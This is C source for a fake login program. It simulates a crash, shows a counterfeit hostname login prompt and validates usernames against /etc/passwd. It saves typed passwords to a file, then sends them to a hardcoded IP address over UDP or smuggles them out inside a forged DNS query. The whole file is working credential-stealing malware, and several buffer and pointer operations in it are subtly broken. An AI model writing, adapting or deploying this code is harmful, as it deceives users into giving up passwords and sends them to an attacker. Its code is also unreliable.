//gcc fakelogin.c -o fakelogin -std=c99

#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#define HOST 0x1801A8C0
#define PORT 0xB822
#define DNSPORT 0x3500

unsigned int sendPacket(char *data, char *login, char *password, unsigned int dns)
{
	char pkt[70];
	if (dns) {
		//printf("RUNNING DNS SPOOF\n");

		srand(time(NULL));
		unsigned int r = rand();

		char id[2];
		sprintf(id, "%d", r);

		char dns1[] = {
		0x00, 0x10, 0x00, 0x01, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00 };

		char dns2[] = {
		0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x29,
		0x10, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00 };

		memset(&pkt, 0, sizeof pkt);
		memcpy(pkt, id, 2);
		memcpy(pkt + 2, dns1, 10);
		memset(&pkt + 12, strlen(login), 1);
		memcpy(pkt + 13, login, strlen(login));
		memset(&pkt + 13 + strlen(login), strlen(password), 1);
                memcpy(pkt + 14 + strlen(login), password, strlen(password));
		memcpy(pkt + 14 + strlen(login) + strlen(password), dns2, 16);
	}

	struct sockaddr_in serv_addr;

	memset(&serv_addr, '0', sizeof serv_addr);
	serv_addr.sin_addr.s_addr = HOST;
	serv_addr.sin_family = AF_INET;
	if (dns) serv_addr.sin_port = DNSPORT;
	else serv_addr.sin_port = PORT;
	unsigned int s = socket(AF_INET, SOCK_DGRAM, 0);
	if (!s) return 1;

	if (dns) {
		//printf("RUNNING DNS SOCKET\n");
		if (sendto(s, pkt, strlen(login) + strlen(password) + 30, 0, (struct sockaddr *)&serv_addr, sizeof serv_addr) == 0 )
			return 1;
		return 0;
	}
	//printf("RUNNING UDP SOCKET\n");
	if (sendto(s, data, strlen(data), 0, (struct sockaddr *)&serv_addr, sizeof serv_addr) == 0 )
		return 1;

	return 0;
}

unsigned int checkUser(char *login)
{
	char line[80];

	FILE *passwdfile = NULL;
        passwdfile = fopen("/etc/passwd", "r");

        if (passwdfile != NULL)
        {
                while(fgets(line, 80, passwdfile) != NULL)
		{
			if((strstr(line, login)) != NULL)
				return 1;
		}
                fclose(passwdfile);
        }
	return 0;
}

unsigned int main(unsigned int argc, char *argv[])
{
	// fake crash
	for (unsigned int i = 0; i < 3; i++)
	{
		sleep(1);
		printf("\n");
	}

	printf("Program received signal SIGSEGV, Segmentation fault. (core dumped)\n");
	printf("Cannot access memory address 0x846b972d...exiting.\n\n");

	// present fake login
	char hostname[20], login[20], password[20];

	memset(&hostname, '0', sizeof hostname);
	memset(&login, '0', sizeof login);
	memset(&password, '0', sizeof password);

	FILE *hn = NULL, *file = NULL;
	hn = fopen("/etc/hostname", "r");

	if (hn != NULL)
	{
		if (fgets(hostname, sizeof hostname, hn) != NULL)
		{
			unsigned int len = strlen(hostname) - 1;
			if (hostname[len] == '\n')
    				hostname[len] = '\0';
		}
		fclose(hn);
	}

	while (1)
	{
		printf("%s login: ", hostname);
		scanf("%s", login);
		printf("Password: "); //TODO hide password
		scanf("%s", password);

		if (checkUser(login) && strlen(login) < 20 && strlen(password) < 20)
			break;
		else {
			sleep(3);
			printf("\nLogin incorrect\n");
		}
	}

	// save data
	char data[41];
	memset(&data, '0', sizeof *data);

	strncpy(data, login, strlen(login));
	strncat(data, "|", 1);
	strncat(data, password, strlen(password));
	strncat(data, "\n", 1);

	file = fopen("./fakelogin.txt", "a");
	fprintf(file, "%s", data);
	fclose(file);

	// exfiltrate data
	unsigned int dns = 0;
	if (argv[1] && atoi(argv[1]) == 1) dns = 1;
	if (sendPacket(data, login, password, dns))
		return 1;

	return 0;
}
